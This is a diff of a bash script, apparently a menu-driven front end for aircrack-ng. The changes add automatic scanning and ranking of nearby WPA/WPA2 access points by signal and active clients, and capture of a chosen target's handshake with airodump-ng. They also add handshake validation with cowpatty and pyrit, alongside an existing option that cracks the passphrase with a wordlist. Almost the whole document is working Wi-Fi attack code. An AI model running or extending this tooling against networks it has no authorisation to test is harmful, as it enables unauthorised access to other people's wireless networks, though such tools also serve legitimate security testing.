@@ -12,62 +12,14 @@ RS="\e[1;31m"
 YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
 YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
 YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
-PAKT="Press "$YS"any key$CE to"
-PAKTC="Press "$YS"any key$CE to continue..."
-PAKTGB="Press "$YS"any key$CE to go back..."
+PAKT="Press "$YS"any key"$CE" to"
+PAKTC="Press "$YS"any key"$CE" to continue..."
+PAKTGB="Press "$YS"any key"$CE" to go back..."
 
 ####################################
 #-----------------FUNCTIONS-----------------
-function scan_networks
+function start_capture
 {
-echo -e "Select what to scan: "
-echo -e ""$YS"ENTER"$CE") All channels"
-echo -e " "$YS"1"$CE"-"$YS"13"$CE") Specific channel"
-echo -e ""$YS" back"$CE") Go back"
-read CHANNELSL
-if [ "$CHANNELSL" = "" ]
-then
-	FJC=0
-	airodump-ng $WLANNM
-elif [ "$CHANNELSL" = "back" ]
-then
-	clear
-	CH="0"
-else
-	FJC=0
-	airodump-ng -c $CHANNELSL $WLANNM
-fi
-}
-function validhandshake
-{
-echo -e "Did you capture the handshake?"$YNYES""
-read HANDVALID
-if [ "$HANDVALID" = "n"]
-then
-	echo -e "Removing the file..."
-	rm $HANDFFP
-	FJC=0
-else
-	FJC=1
-fi
-clear
-}
-function capture_handshake
-{
-AA=-1
-echo -e "Enter your target's bssid: "
-read -e TARGB
-echo -e "Enter your target's channel: "
-read -e TARGC
-echo -e "Enter the name of the handshake file(no extension): "
-echo -e "(don't use the same name twice)"
-echo -e "Type "0" for no file"
-read -e HANDF
-HANDFFP="/root/handshakes/$HANDF-01.cap"
-export HANDFFP
-export TARGB
-export TARGC
-clear
 if [ "$HANDF" != "0" ]
 then
 	gnome-terminal --geometry 70x10+0+0 -e lh2
@@ -95,6 +47,290 @@ else
 		exec bash "$0"
 	fi
 fi
+}
+function remove_temps
+{
+	if [ -f /root/lscript/tempairodump-01.cap ]
+	then
+		rm /root/lscript/tempairodump-01.cap
+	fi
+	if [ -f /root/lscript/tempairodump-01.csv ]
+	then
+		rm /root/lscript/tempairodump-01.csv
+	fi
+	if [ -f /root/lscript/tempairodump-01.kismet.netxml ]
+	then
+		rm /root/lscript/tempairodump-01.kismet.netxml
+	fi
+	if [ -f /root/lscript/tempairodump-01.kismet.csv ]
+	then
+		rm /root/lscript/tempairodump-01.kismet.csv
+	fi
+}
+function autoapselect
+{
+file="/root/lscript/tempairodump-01.csv"
+lines=$(cat $file | awk '/WPA|WPA2/ {print}' | awk 'END{print NR}')
+n2=1
+power=100
+while [ $n2 -le "$lines" ]
+do
+	n3=$((n2+2))
+	apower[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", -"}{if(NR==nn && /WPA|WPA2/)print $2}' | cut -d ',' -f1)
+	adata[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "} {if(NR==nn && /WPA|WPA2/)print $10}')
+	aessid[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "} {if(NR==nn && /WPA|WPA2/)print $13}')
+	achannel[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "} {if(NR==nn && /WPA|WPA2/)print $4}')
+	amac[$n2]=$(cat $file | awk -v nn="$n3" '{FS=", "} {if(NR==nn && /WPA|WPA2/)print $1}')
+	powerunfixed="${apower[$n2]}"
+	apowerfixed[$n2]=$powerunfixed
+	apowerfixed[$n2]=$((power-apowerfixed[$n2]))
+	#echo ""$n2") "${apowerfixed[$n2]}"% "${amac[$n2]}" "${achannel[$n2]}" "${adata[$n2]}" "${aessid[$n2]}""
+	n2=$(( n2+1 ))
+done
+n3=1
+while [ $n3 -le "$lines" ]
+do
+	n=1
+	topsignal=100
+	while [ $n -le "$lines" ]
+	do
+		if [ ${apowerfixed[$n]} -le $topsignal ]
+		then
+			lowestn=$n
+			topsignal=${apowerfixed[$n]}				
+		fi
+		n=$((n+1))
+	done 
+	zn[$n3]=$lowestn
+	zdata[$n3]=${adata[$lowestn]}
+	zessid[$n3]=${aessid[$lowestn]}
+	zpowerfixed[$n3]=${apowerfixed[$lowestn]}
+	zmac[$n3]=${amac[$lowestn]}
+	zchannel[$n3]=${achannel[$lowestn]}
+	apowerfixed[$lowestn]=101
+	n3=$((n3+1))
+done
+n3=1
+echo -e "     POWER ESSID                                  MAC               ACTIVE CLIENTS"
+while [ $n3 -le "$lines" ]
+do
+	size=${#zessid[$n3]}
+	calc=$(( 40-size ))
+	numcalc=1
+	SPACES=""
+	while [ $numcalc != $calc ]
+	do
+		SPACES=""$SPACES"_"
+		numcalc=$(( numcalc+1 ))
+	done
+	if [ $n3 -le 9 ]
+	then
+		num=" "$n3""
+	else
+		num=$n3
+	fi
+	size=${#zpowerfixed[$n3]}
+	if [ $size == 3 ]
+	then
+		space=""
+	elif [ $size == 2 ]
+	then
+		space=" "
+	elif [ $size == 1 ]
+	then
+		space="  "
+	fi
+	if [ ! ${zpowerfixed[$n3]} = 100 ]
+	then
+		size2=${#zessid[$n3]}
+		if [[ $size2 -eq 36 ]]
+		then
+			zessid[$n3]="____________________________________"
+		fi
+		START=""
+		if [ ${zdata[$n3]} -gt 0 ]
+		then
+			CLIENTS="YES""$CE"
+			START="$YS"
+		else
+			START="$RS"
+			CLIENTS="NO""$CE"
+		fi
+		echo -e ""$YS""$num""$CE") "$START"${space}"${zpowerfixed[$n3]}"%   "${zessid[$n3]}""$SPACES""${zmac[$n3]}" "$CLIENTS""
+	fi
+	n3=$((n3+1))
+done
+echo -e ""$YS" r"$CE") rescan"
+echo -e ""$YS"back"$CE") Go back"
+echo -e "Choose: "
+}
+function capture_again
+{
+			echo -e "Capture handshake again on the same network? "$YNYES""
+			read CAGAIN
+			if [ ! "$CAGAIN" = "n" ]
+			then
+				gnome-terminal --geometry 70x10+0+0 -e lh2
+				airodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/$HANDF $WLANNM
+				validhandshake
+				exec bash "$0"
+			fi
+}
+function scan_networks
+{
+while true
+do
+	remove_temps
+	echo -e "Select what to scan: "
+	echo -e ""$YS"ENTER"$CE") All channels"
+	echo -e " "$YS"1"$CE"-"$YS"13"$CE") Specific channel"
+	echo -e ""$YS" back"$CE") Go back"
+	read CHANNELSL
+	echo -e "Press CTRL C when you want"
+	if [ "$CHANNELSL" = "" ]
+	then
+		FJC=0
+		airodump-ng $WLANNM -w /root/lscript/tempairodump
+	elif [ "$CHANNELSL" = "back" ]
+	then
+		clear
+		CH="0"
+		break
+	else
+		FJC=0
+		airodump-ng -c $CHANNELSL $WLANNM -w /root/lscript/tempairodump
+	fi
+	clear
+	autoapselect
+	read APCHOOSE
+	clear
+	if [ $APCHOOSE = "back" ]
+	then
+		clear
+		break
+	elif [ $APCHOOSE = "r" ]
+	then
+		clear
+		continue
+	else
+		TARGB="${zmac[$APCHOOSE]}"
+		TARGC="${zchannel[$APCHOOSE]}"
+		echo -e "Enter the name of the handshake file(no extention)(e.g: "$YS"hand1"$CE")"
+		echo -e "(don't use the same name twice)"
+		echo -e "Type "$YS""0""$CE" for no file"
+		read -e HANDF
+		HANDFFP="/root/handshakes/"$HANDF"-01.cap"
+		HANDCAP="/root/handshakes/"$HANDF"-01.cap"
+		export HANDCAP
+		export HANDFFP
+		export TARGB
+		export TARGC
+		clear
+		start_capture
+		break
+	fi
+done
+}
+function validate_with_pyrit
+{
+	clear
+	echo -e "Checking handshake with pyrit..."
+	TEMPHAND=$(pyrit -r "$HANDCAP" analyze | grep "No valid EAOPL-handshake + ESSID detected.")
+	clear
+	if [ "$TEMPHAND" = "" ]
+	then
+		VALIDH=1
+		TEMPHANDD=$(pyrit -r "$HANDCAP" analyze | grep "good")
+		if [ "$TEMPHANDD" = "" ]
+		then
+			TEMPHANDDD=$(pyrit -r "$HANDCAP" analyze | grep "bad")
+			if [ "TEMPHANDDD" = "" ]
+			then
+				echo -e "Valid handshake found!(Status: unknown)"
+			else
+				echo -e "Valid handshake found!(Status: bad)"
+			fi
+		else
+			echo -e "Valid handshake found!(Status: good)"
+			sleep 2
+		fi
+	else
+		VALIDH=0
+		echo -e "No handshake found."
+		sleep 2
+	fi
+}
+function validate_with_cowpatty
+{
+	clear
+	echo -e "Checking handshake with cowpatty..."
+	sleep 1
+	TEMPHAND=$(cowpatty -c -r "$HANDCAP" | grep "Collected all necessary data to mount crack against WPA2/PSK passphrase.")
+	clear
+	if [ "$TEMPHAND" = "" ]
+	then
+		VALIDH=0
+		echo -e "No handshake found."
+		sleep 1
+		echo -e ""
+		echo -e "Press "$YS"enter"$CE" to check with pyrit..."
+		read
+		validate_with_pyrit
+	else
+		VALIDH=1
+		echo -e "Valid handshake found!"
+		sleep 2
+	fi
+}
+function validhandshake
+{
+echo -e "Did you capture the handshake?"$YNYES""
+read HANDVALID
+if [ "$HANDVALID" = "n" ]
+then
+	echo -e "Removing the file..."
+	sleep 2
+	rm $HANDFFP
+	FJC=0
+else
+	FJC=1
+	HANDCAP=/root/handshakes/"$HANDF"-01.cap
+	validate_with_cowpatty
+	if [ "$VALIDH" = "0" ]
+	then
+		FJC=0
+		echo -e "Couldn't validate your handshake. Delete it? "$YNYES""
+		read NOVALDEL
+		if [ ! "$NOVALDEL" = "n" ]
+		then
+			rm /root/handshakes/"$HANDF"-01.*
+			clear
+			capture_again
+		fi
+	fi
+			
+fi
+clear
+}
+function capture_handshake
+{
+AA=-1
+echo -e "Enter your target's bssid: "
+read -e TARGB
+echo -e "Enter your target's channel: "
+read -e TARGC
+echo -e "Enter the name of the handshake file(no extension): "
+echo -e "(don't use the same name twice)"
+echo -e "Type "$YS""0""$CE" for no file"
+read -e HANDF
+HANDFFP="/root/handshakes/"$HANDF"-01.cap"
+HANDCAP="/root/handshakes/"$HANDF"-01.cap"
+export HANDCAP
+export HANDFFP
+export TARGB
+export TARGC
+clear
+start_capture
 }
 function aircrack_handshakejust
 {
@@ -201,10 +437,11 @@ function aircrack_handshake
 	clear
 	aircrack-ng -w $WORDFF $HANDFFT
 }
-
-#-------------------------------------------
+function main_handshake_options
+{
 while true
 do
+clear
 printf '\033]2;HANDSHAKE\a'
 if [ -f "/root/handshakes/*.csv" ]
 then
@@ -215,15 +452,16 @@ echo -e "----------------------------"$RS"HANDSHAKE"$CE"------------------------
 echo -e ""$YS" 1"$CE") Scan networks nearby"
 echo -e ""$YS" 2"$CE") Capture handshake"
 echo -e ""$YS" 3"$CE") Aircrack the handshake"
-echo -e ""$YS" 4"$CE") Remove .csv and .netxml files"
+echo -e ""$YS" 4"$CE") Verify a handshake"
+echo -e ""$YS" 5"$CE") Remove .csv and .netxml files"
 echo -e ""$YS" 0"$CE") EXIT"
 echo -e " Choose: "
 sleep 1
 CH=0
 read -e AA
+clear
 if [ "$AA" = "1" ]
 then
-	clear
 	CH=1
 	scan_networks
 elif [ "$AA" = "2" ]
@@ -233,13 +471,39 @@ elif [ "$AA" = "3" ]
 then
 	if [ "$FJC" = "1" ]
 	then
-	AAGAIN=1
-	aircrack_handshakejust
+		AAGAIN=1
+		aircrack_handshakejust
 	else
-	AAGAIN=2
-	aircrack_handshake
+		AAGAIN=2
+		aircrack_handshake
 	fi
 elif [ "$AA" = "4" ]
+then
+	echo -e "------------------You are in /root/handshakes folder--------------------"
+	ls /root/handshakes
+	echo -e "Type the name of the handshake you want to check:(e.g: "$YS"hand1-01"$CE")"
+	echo -e ""$RS"No extention"$CE""
+	read HANDF
+	if [ ! -f /root/handshakes/"$HANDF" ]
+	then
+		if [ -f /root/handshakes/"$HANDF".cap ]
+		then
+			HANDCAP=/root/handshakes/"$HANDF".cap
+		else
+			if [ -f /root/handshakes/"$HANDF"-01.cap ]
+			then
+				HANDCAP=/root/handshakes/"$HANDF"-01.cap
+			else
+				echo -e "Handshake file not found!"
+				sleep 3
+				continue
+			fi
+		fi
+	else
+		HANDCAP=/root/handshakes/"$HANDF"
+	fi
+	validate_with_cowpatty
+elif [ "$AA" = "5" ]
 then
 	rm /root/handshakes/*.csv
 	rm /root/handshakes/*.netxml
@@ -256,42 +520,21 @@ else
 	clear
 	exec bash "$0"
 fi
-if [ "$CH" = "1" ]
-then
-	echo -e "Do you want to capture a handshake now?"$YNYES": "
-	read CHCH
-	if [ "$CHCH" = "n" ]
-	then
-	clear
-	exec bash "$0"
-	CH=0
-	
-	else
-		capture_handshake
-	fi
-fi
-done
-#~ echo -e "Choose again?"$YNYES": "
-#~ read -e BB
-#~ if [ -z "$BB" ]
+#~ if [ "$CH" = "1" ]
 #~ then
-	#~ if [ "$AA" = "1" ]
-		#~ then
-		#~ exec bash "$0"
-	#~ else
-		#~ clear
-		#~ exec bash "$0"
-	#~ fi
-#~ elif [ "$BB" = "y" ]
-#~ then
-	#~ if [ "$AA" = "1" ]
-		#~ then
-		#~ exec bash "$0"
-	#~ else
-		#~ clear
-		#~ exec bash "$0"
-	#~ fi
-#~ else
+	#~ echo -e "Do you want to capture a handshake now?"$YNYES": "
+	#~ read CHCH
+	#~ if [ "$CHCH" = "n" ]
+	#~ then
 	#~ clear
-	#~ exit
+	#~ exec bash "$0"
+	#~ CH=0
+	
+	#~ else
+		#~ capture_handshake
+	#~ fi
 #~ fi
+done	
+}
+#-------------------------------------------
+main_handshake_options
